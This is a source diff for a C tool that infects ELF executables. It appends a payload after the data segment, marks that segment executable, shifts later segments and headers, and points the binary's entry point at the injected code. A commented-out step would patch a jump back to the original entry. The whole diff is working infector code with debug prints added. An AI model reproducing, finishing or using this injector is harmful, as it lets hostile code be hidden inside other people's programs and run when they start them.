@@ -19,6 +19,7 @@ int open_map_elf(char* filename, uint8_t** data, int padding) {
   }
 
   size = lseek(fd, 0, SEEK_END);
+  ftruncate(fd, size + padding);
 
   *data = mmap(0, size + padding, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 
@@ -39,7 +40,8 @@ Elf64_Shdr* find_elf64_sections (uint8_t* data, char* name) {
       return &shdr[i];
     }
   }
-  perror("Cannot find elf section");
+  printf("Missing %s\n", name);
+  // perror("Cannot find elf section");
   exit(-1);
 }
 
@@ -94,13 +96,21 @@ int main(int argc, char* argv[]) {
   
   // Push down section headers.
   ehdr->e_shoff += payload_size;
-  
-  uint8_t* data_segment_end = target_data + data_seg->p_offset + data_seg->p_filesz; 
+ 
+  int payload_dest_offset = data_seg->p_offset + data_seg->p_filesz; 
+  uint8_t* payload_dest = target_data + payload_dest_offset; 
 
   // Adjust data segment.
   data_seg->p_filesz += payload_size;
   data_seg->p_memsz += payload_size;
   data_seg->p_flags |= PF_X;
+
+  // Adjust segments occuring after data.
+  for (int i = 0; i < ehdr->e_phnum; i++) {
+    if (phdr[i].p_offset > data_seg->p_offset) {
+      phdr[i].p_offset += payload_size;
+    }
+  }
 
   // Adjust .bss section.
   bss->sh_addr += payload_size;
@@ -108,21 +118,22 @@ int main(int argc, char* argv[]) {
 
   // Copy payload to code cave.
   int bytes_to_move = lseek(target_fd, 0, SEEK_END) - data_seg->p_offset - data_seg->p_filesz; 
-  memmove(data_segment_end + payload_size, data_segment_end, bytes_to_move);
+  memmove(payload_dest + payload_size, payload_dest, bytes_to_move);
 
-  memmove(data_segment_end, payload_code, payload_size); 
+  memmove(payload_dest, payload_code, payload_size); 
 
-/*
   // Adjust entry point to point to code cave.
-  int data_end_offset = data_seg->p_offset + data_seg->p_filesz;
-  int dist_to_end = data_end_offset - ehdr->e_entry;
-  ehdr->e_entry = data_end_offset;
+  printf("\nEntry: %ld Code End: %d\n", ehdr->e_entry, payload_dest_offset);
+  int dist_to_end = payload_dest_offset - ehdr->e_entry;
+  printf("Dist to end %d\n", dist_to_end);
+  ehdr->e_entry = payload_dest_offset + 25;
 
   // Patch relative jump to revert control flow to original entry.
-  short int* place = find_placeholder(data_segment_end);
+/*
+  short int* place = find_placeholder(code_cave);
   *place = dist_to_end + BACKWARD_JUMP_VALUE;
+  printf("Placeholder patched with %hu\n", *place);
 */
-
   close(target_fd);
   close(payload_fd);
 
